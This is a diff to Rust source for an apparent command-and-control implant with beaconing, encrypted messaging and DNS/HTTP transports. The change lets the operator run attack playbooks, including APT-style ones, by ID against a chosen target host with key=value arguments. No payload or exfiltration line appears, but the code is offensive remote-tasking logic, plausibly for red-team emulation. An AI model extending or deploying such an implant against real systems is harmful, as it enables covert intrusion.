@@ -6,7 +6,9 @@ use crate::agent::crypto::AgentCrypto;
 use crate::agent::protocol::{AgentCommand, AgentResponse, BeaconMessage, MessageType};
 use crate::agent::ratchet::{MessageHeader, RatchetState};
 use crate::agent::transport::{csprng_u64, dns::DnsTransport, http::HttpTransport, TransportChain};
-use crate::playbooks::{Playbook, PlaybookContext, PlaybookExecutor};
+use crate::playbooks::{
+    get_apt_playbook, get_playbook, Playbook, PlaybookContext, PlaybookExecutor,
+};
 use crate::serde_json;
 use std::collections::HashMap;
 use std::time::Duration;
@@ -363,29 +365,54 @@ impl AgentClient {
                     };
                 }
 
-                // Expect arg[0] to be serialized playbook
-                let playbook_res: Result<Playbook, _> = serde_json::from_str(&cmd.args[0]);
-                match playbook_res {
-                    Ok(playbook) => {
-                        let mut context = PlaybookContext::new("localhost"); // TODO: Use real target
-                        let mut executor = PlaybookExecutor::new();
-                        let result = executor.execute(&playbook, &mut context);
+                // Accept both serialized playbook JSON and playbook ID lookups.
+                let playbook_definition = serde_json::from_str::<Playbook>(&cmd.args[0])
+                    .ok()
+                    .or_else(|| get_playbook(&cmd.args[0]).or_else(|| get_apt_playbook(&cmd.args[0])));
 
-                        let output = serde_json::to_string(&result).unwrap_or_default();
-
-                        AgentResponse {
-                            command_id: cmd.id,
-                            success: result.success,
-                            output,
-                            error: None,
-                        }
-                    }
-                    Err(e) => AgentResponse {
+                let Some(playbook) = playbook_definition else {
+                    return AgentResponse {
                         command_id: cmd.id,
                         success: false,
                         output: String::new(),
-                        error: Some(format!("Failed to parse playbook: {}", e)),
-                    },
+                        error: Some(format!(
+                            "Unknown playbook: {}",
+                            cmd.args[0].replace('\n', " ")
+                        )),
+                    };
+                };
+
+                let mut context = PlaybookContext::new(
+                    cmd.args
+                        .get(1)
+                        .filter(|arg| !arg.contains('='))
+                        .unwrap_or(&"localhost".to_string()),
+                );
+
+                for arg in cmd
+                    .args
+                    .iter()
+                    .skip(if cmd.args.get(1).is_some_and(|arg| !arg.contains('=')) {
+                        2
+                    } else {
+                        1
+                    })
+                {
+                    if let Some((k, v)) = arg.split_once('=') {
+                        context.set_arg(k, v);
+                    }
+                }
+
+                let mut executor = PlaybookExecutor::new();
+                let result = executor.execute(&playbook, &mut context);
+
+                let output = serde_json::to_string(&result).unwrap_or_default();
+
+                AgentResponse {
+                    command_id: cmd.id,
+                    success: result.success,
+                    output,
+                    error: None,
                 }
             }
             "access" => {
